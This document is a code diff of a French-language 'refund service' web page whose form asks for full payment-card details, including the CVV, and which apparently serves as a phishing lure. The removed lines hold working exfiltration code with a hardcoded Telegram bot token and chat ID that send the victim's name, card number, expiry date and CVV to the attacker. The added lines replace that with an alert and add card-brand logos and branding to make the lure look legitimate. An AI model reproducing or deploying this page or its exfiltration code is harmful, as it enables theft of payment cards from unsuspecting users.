@@ -17,81 +17,82 @@
         .hidden {
             display: none;
         }
+        .card-icons img {
+            width: 50px;
+            margin-right: 10px;
+        }
     </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen">
-    <div class="bg-white shadow-xl rounded-lg p-8 w-full max-w-md">
-        <h1 class="text-3xl font-bold text-gray-800 text-center mb-6">Formulaire de Remboursement</h1>
-        <form id="remboursement-form" onsubmit="return validateForm(event)">
-            <!-- Nom du titulaire -->
-            <div class="mb-4">
-                <label for="nom" class="block text-sm font-medium text-gray-700">Nom du titulaire</label>
-                <input type="text" id="nom" name="nom" placeholder="Ex : Jean Dupont" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+<body class="bg-gray-100">
+    <!-- HEADER -->
+    <header class="bg-blue-600 text-white py-4 shadow-lg">
+        <div class="container mx-auto text-center">
+            <h1 class="text-4xl font-bold">Service de Remboursement</h1>
+            <p class="mt-1 text-lg">Nous acceptons toutes les cartes bancaires</p>
+        </div>
+    </header>
+
+    <!-- MAIN FORM SECTION -->
+    <section class="flex items-center justify-center min-h-screen">
+        <div class="bg-white shadow-2xl rounded-lg p-8 w-full max-w-lg">
+            <h2 class="text-3xl font-bold text-center text-gray-800 mb-6">Formulaire de Remboursement</h2>
+            <div class="flex justify-center mb-6 card-icons">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MasterCard">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/1/16/PayPal_logo.svg" alt="PayPal">
             </div>
-            <!-- Numéro de la carte -->
-            <div class="mb-4">
-                <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de la carte</label>
-                <input type="text" id="numero-carte" name="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
-                    class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
-                <p id="card-error" class="error-message hidden">Le numéro de la carte doit contenir 16 chiffres.</p>
-            </div>
-            <!-- Date d'expiration -->
-            <div class="mb-4">
-                <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration</label>
-                <input type="month" id="date-expiration" name="date-expiration" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
-                <p id="date-error" class="error-message hidden">La date d'expiration est invalide ou déjà passée.</p>
-            </div>
-            <!-- Code CVV -->
-            <div class="mb-6">
-                <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
-                <input type="text" id="cvv" name="cvv" placeholder="123" required maxlength="3"
-                    class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
-                <p id="cvv-error" class="error-message hidden">Le CVV doit contenir exactement 3 chiffres.</p>
-            </div>
-            <!-- Bouton de confirmation -->
-            <button type="submit"
-                class="w-full bg-blue-600 text-white font-bold py-2 px-4 rounded-md hover:bg-blue-700 transition duration-300">
-                Confirmer le Remboursement
-            </button>
-        </form>
-    </div>
+            <form id="remboursement-form" onsubmit="return validateForm(event)">
+                <div class="mb-4">
+                    <label for="nom" class="block text-sm font-medium text-gray-700">Nom du titulaire</label>
+                    <input type="text" id="nom" name="nom" placeholder="Ex : Jean Dupont" required
+                        class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
+                </div>
+                <div class="mb-4">
+                    <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de la carte</label>
+                    <input type="text" id="numero-carte" name="numero-carte" placeholder="1234 5678 9012 3456" required
+                        class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
+                    <p id="card-error" class="error-message hidden">Le numéro de la carte doit contenir 16 chiffres.</p>
+                </div>
+                <div class="mb-4">
+                    <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration</label>
+                    <input type="month" id="date-expiration" name="date-expiration" required
+                        class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
+                    <p id="date-error" class="error-message hidden">La date d'expiration est invalide.</p>
+                </div>
+                <div class="mb-6">
+                    <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" required maxlength="3"
+                        class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
+                    <p id="cvv-error" class="error-message hidden">Le CVV doit contenir exactement 3 chiffres.</p>
+                </div>
+                <button type="submit"
+                    class="w-full bg-blue-600 text-white font-bold py-2 px-4 rounded-md hover:bg-blue-700 transition duration-300">
+                    Confirmer le Remboursement
+                </button>
+            </form>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer class="bg-gray-800 text-white py-6 mt-10">
+        <div class="container mx-auto text-center">
+            <p class="text-sm">© 2024 Service de Remboursement. Tous droits réservés.</p>
+            <p class="mt-2">
+                Contactez-nous: 
+                <a href="mailto:support@remboursement.com" class="text-blue-400 hover:underline">support@remboursement.com</a>
+            </p>
+            <p class="mt-1">
+                Suivez-nous sur:
+                <a href="#" class="text-blue-400 hover:underline mx-1">Facebook</a> | 
+                <a href="#" class="text-blue-400 hover:underline mx-1">Twitter</a> | 
+                <a href="#" class="text-blue-400 hover:underline mx-1">Instagram</a>
+            </p>
+        </div>
+    </footer>
 
     <script>
-        const token = "7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I";  // توكن البوت
-        const chatId = "5372119436"; // الـ chat_id الخاص بك
-
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
-            const data = {
-                chat_id: chatId,
-                text: message
-            };
-
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert("✅ Les informations ont été envoyées avec succès à Telegram !");
-                } else {
-                    alert(`❌ Erreur: ${data.description}`);
-                    console.error("Erreur d'envoi:", data.description);
-                }
-            })
-            .catch(error => {
-                alert("❌ Une erreur est survenue lors de l'envoi des données.");
-                console.error("Erreur réseau:", error);
-            });
-        }
-
         function validateForm(event) {
             event.preventDefault();
-
             const nom = document.getElementById('nom').value;
             const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, '');
             const cvv = document.getElementById('cvv').value;
@@ -122,14 +123,7 @@
             }
 
             if (valid) {
-                const message = `
-                🧾 Nouveau remboursement:
-                - Nom: ${nom}
-                - Numéro de carte: ${cardNumber}
-                - Date d'expiration: ${document.getElementById('date-expiration').value}
-                - CVV: ${cvv}
-                `;
-                sendToTelegram(message);
+                alert("✅ Le remboursement a été confirmé !");
             }
         }
     </script>
